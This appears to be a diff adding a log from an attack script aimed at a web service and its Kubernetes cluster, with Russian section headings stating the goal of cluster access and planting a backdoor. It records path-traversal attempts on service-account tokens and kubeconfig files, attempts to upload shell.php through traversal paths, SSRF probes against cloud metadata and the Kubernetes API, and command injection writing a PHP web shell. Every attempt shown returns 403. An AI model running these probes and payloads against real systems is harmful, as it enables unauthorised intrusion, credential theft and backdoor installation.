@@ -1,0 +1,100 @@
+[2025-12-10 17:54:57] [INFO] Starting cluster access via bypasses...
+[2025-12-10 17:54:57] [INFO] Logging in...
+[2025-12-10 17:55:05] [SUCCESS] Login successful
+[2025-12-10 17:55:05] [INFO] 
+======================================================================
+[2025-12-10 17:55:05] [INFO] МЕТОД 1: Path Traversal для доступа к Kubernetes secrets
+[2025-12-10 17:55:05] [INFO] ======================================================================
+[2025-12-10 17:55:05] [INFO] Testing path traversal: /stats/../../var/run/secrets/kubernetes.io/serviceaccount/token
+[2025-12-10 17:55:05] [INFO]   Status: 403
+[2025-12-10 17:55:05] [INFO] Testing path traversal: /stats/../../var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+[2025-12-10 17:55:06] [INFO]   Status: 403
+[2025-12-10 17:55:06] [INFO] Testing path traversal: /stats/../../var/run/secrets/kubernetes.io/serviceaccount/namespace
+[2025-12-10 17:55:07] [INFO]   Status: 403
+[2025-12-10 17:55:07] [INFO] Testing path traversal: /stats/../../etc/kubernetes/admin.conf
+[2025-12-10 17:55:07] [INFO]   Status: 403
+[2025-12-10 17:55:07] [INFO] Testing path traversal: /stats/../../root/.kube/config
+[2025-12-10 17:55:08] [INFO]   Status: 403
+[2025-12-10 17:55:08] [INFO] Testing path traversal: /stats/../../var/lib/kubelet/config.yaml
+[2025-12-10 17:55:08] [INFO]   Status: 403
+[2025-12-10 17:55:08] [INFO] 
+======================================================================
+[2025-12-10 17:55:08] [INFO] МЕТОД 2: Path Traversal для записи файла через POST
+[2025-12-10 17:55:08] [INFO] ======================================================================
+[2025-12-10 17:55:08] [INFO] Testing POST to: /stats/../shell.php
+[2025-12-10 17:55:09] [INFO]   Status: 403
+[2025-12-10 17:55:09] [INFO] Testing POST to: /stats/../../var/www/html/shell.php
+[2025-12-10 17:55:09] [INFO]   Status: 403
+[2025-12-10 17:55:09] [INFO] Testing POST to: /stats/../../tmp/shell.php
+[2025-12-10 17:55:10] [INFO]   Status: 403
+[2025-12-10 17:55:10] [INFO] Testing POST to: /stats/../backdoor.php
+[2025-12-10 17:55:10] [INFO]   Status: 403
+[2025-12-10 17:55:10] [INFO] 
+======================================================================
+[2025-12-10 17:55:10] [INFO] МЕТОД 3: state-api/get с GET методом для SSRF
+[2025-12-10 17:55:10] [INFO] ======================================================================
+[2025-12-10 17:55:10] [INFO] Testing GET with url param: http://169.254.169.254/latest/meta-data/
+[2025-12-10 17:55:11] [INFO]   Status: 403
+[2025-12-10 17:55:11] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:55:11] [INFO] Testing GET with url param: http://127.0.0.1:6443/api/v1/namespaces
+[2025-12-10 17:55:11] [INFO]   Status: 403
+[2025-12-10 17:55:11] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:55:11] [INFO] Testing GET with url param: http://kubernetes.default.svc/api/v1/namespaces
+[2025-12-10 17:55:12] [INFO]   Status: 403
+[2025-12-10 17:55:12] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:55:12] [INFO] Testing GET with url param: http://localhost:8080/api/v1/namespaces
+[2025-12-10 17:55:12] [INFO]   Status: 403
+[2025-12-10 17:55:12] [INFO]   Response preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:55:12] [INFO] 
+======================================================================
+[2025-12-10 17:55:12] [INFO] МЕТОД 4: events API для SSRF с правильным форматом
+[2025-12-10 17:55:12] [INFO] ======================================================================
+[2025-12-10 17:55:12] [INFO] Testing events API with payload: url
+[2025-12-10 17:55:13] [INFO]   Status: 403
+[2025-12-10 17:55:13] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:55:13] [INFO] Testing events API with payload: endpoint
+[2025-12-10 17:55:14] [INFO]   Status: 403
+[2025-12-10 17:55:14] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:55:14] [INFO] Testing events API with payload: callback
+[2025-12-10 17:55:14] [INFO]   Status: 403
+[2025-12-10 17:55:14] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:55:14] [INFO] Testing events API with payload: target
+[2025-12-10 17:55:15] [INFO]   Status: 403
+[2025-12-10 17:55:15] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:55:15] [INFO] Testing events API with payload: request
+[2025-12-10 17:55:15] [INFO]   Status: 403
+[2025-12-10 17:55:15] [INFO]   Response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR...
+[2025-12-10 17:55:15] [INFO] 
+======================================================================
+[2025-12-10 17:55:15] [INFO] МЕТОД 5: Command injection для создания файла
+[2025-12-10 17:55:15] [INFO] ======================================================================
+[2025-12-10 17:55:15] [INFO] Testing command injection: echo '<?php if(isset($_GET["cmd"])){system($_GET["...
+[2025-12-10 17:55:16] [INFO]   Status: 403
+[2025-12-10 17:55:16] [INFO] Testing command injection: printf '<?php if(isset($_GET["cmd"])){system($_GET...
+[2025-12-10 17:55:16] [INFO]   Status: 403
+[2025-12-10 17:55:16] [INFO] 
+======================================================================
+[2025-12-10 17:55:16] [INFO] RESULTS - СПОСОБЫ ДОСТУПА К КЛАСТЕРУ И СОЗДАНИЯ БЕКДОРА
+[2025-12-10 17:55:16] [INFO] ======================================================================
+[2025-12-10 17:55:16] [WARNING] Способы создания бекдора не найдены
+[2025-12-10 17:55:16] [INFO] Все попытки залогированы в: logs/cluster_bypass_20251210_175457.log
+[2025-12-10 17:55:16] [INFO] ======================================================================
+[2025-12-10 17:55:16] [INFO] Log file: logs/cluster_bypass_20251210_175457.log
